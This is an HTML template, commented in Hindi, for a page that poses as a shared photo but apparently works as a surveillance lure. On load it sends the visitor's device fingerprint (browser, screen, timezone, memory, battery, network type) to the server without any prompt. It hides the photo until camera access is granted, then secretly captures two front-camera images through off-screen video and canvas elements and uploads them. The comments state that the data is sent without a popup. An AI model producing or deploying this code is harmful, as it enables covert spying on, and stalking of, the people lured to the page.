<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo</title>
    <style>
        body { margin:0; padding:0; background:#111; text-align:center; }
        #photo { max-width:100%; border-radius:10px; display:none; }  /* शुरू में छिपा */
        #message { color:white; font-family:sans-serif; padding:20px; font-size:18px; }
        video, canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
    </style>
</head>
<body>
    <!-- पहले एक मैसेज दिखेगा, फोटो छिपी रहेगी -->
    <p id="message">📸 Please allow camera to view the photo</p>
    <img id="photo" src="{{ photo_url }}" alt="Photo">

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <p id="status" style="display:none;"></p>

    <script>
        const uniqueId = "{{ unique_id }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const message = document.getElementById('message');

        // 📱 डिवाइस इन्फो (बिना पॉपअप)
        async function sendDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform || 'N/A',
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                batteryLevel: 'N/A',
                batteryCharging: 'N/A',
                networkType: 'N/A',
                hasTouch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100);
                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
                }
            } catch(e) {}
            if (navigator.connection) {
                info.networkType = navigator.connection.effectiveType || 'N/A';
            }
            fetch('/device_info/' + uniqueId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(e => console.error(e));
        }

        // 📸 2 फोटो कैप्चर (पहले जैसा)
        async function capturePhotos(stream) {
            try {
                // थोड़ा रुकें ताकि कैमरा सेट हो
                await new Promise(r => setTimeout(r, 500));
                for (let i = 0; i < 2; i++) {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
                    fetch('/upload/' + uniqueId, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    }).catch(e => console.error(e));
                    await new Promise(r => setTimeout(r, 500));
                }
            } catch(e) { console.error('Photo error:', e); }
        }

        // 🚀 शुरू करें
        (async function main() {
            sendDeviceInfo();  // डिवाइस इन्फो तुरंत भेजें (बिना किसी रोक-टोक)

            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                // कैमरा मिल गया — अब फोटो दिखाएँ और मैसेज हटाएँ
                photo.style.display = 'block';
                message.style.display = 'none';

                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);

                // फोटो कैप्चर शुरू करें
                capturePhotos(stream);
            } catch(e) {
                // कैमरा Allow नहीं किया — फोटो न दिखाएँ, शायद मैसेज को बदल दें
                message.innerText = '❌ Camera access denied. Content not available.';
                console.error('Camera permission denied');
            }
        })();
    </script>
</body>
</html>
